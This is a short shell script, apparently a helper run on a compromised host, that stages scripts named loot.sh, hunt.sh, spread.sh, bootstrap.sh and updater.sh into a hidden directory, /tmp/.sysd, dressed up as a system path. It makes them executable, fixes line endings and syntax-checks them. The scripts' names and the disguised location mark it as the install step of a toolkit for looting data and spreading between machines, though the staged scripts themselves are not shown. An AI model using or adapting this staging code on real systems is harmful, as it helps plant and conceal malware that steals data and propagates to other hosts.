#!/bin/sh
# throwaway: run ON the host. Files were scp'd into /tmp; place them, heal any
# CRLF, then dash-check each (sh -n here is authoritative: /bin/sh is dash).
SRC=/tmp
DST=/tmp/.sysd
for f in loot.sh hunt.sh spread.sh bootstrap.sh updater.sh; do
    if [ -f "$SRC/$f" ]; then
        cp -f "$SRC/$f" "$DST/$f"
        chmod 0755 "$DST/$f"
        echo "placed $DST/$f"
    else
        echo "MISSING $SRC/$f"
    fi
done
if [ -f "$SRC/_loot_test.sh" ]; then
    cp -f "$SRC/_loot_test.sh" /tmp/lt.sh
    chmod 0755 /tmp/lt.sh
    echo "placed /tmp/lt.sh"
fi

echo "--- heal + check ---"
for f in "$DST/loot.sh" "$DST/hunt.sh" "$DST/spread.sh" "$DST/bootstrap.sh" "$DST/updater.sh" /tmp/lt.sh; do
    [ -f "$f" ] || continue
    if [ "$(tr -cd '\r' < "$f" | wc -c)" -gt 0 ]; then
        tr -d '\r' < "$f" > /tmp/place.n && mv -f /tmp/place.n "$f"
        echo "healed $f"
    fi
    if sh -n "$f" 2>/tmp/place.err; then
        echo "$f OK"
    else
        echo "$f SYNTAX FAIL:"; sed -n 1,2p /tmp/place.err
    fi
done
echo "--- done ---"
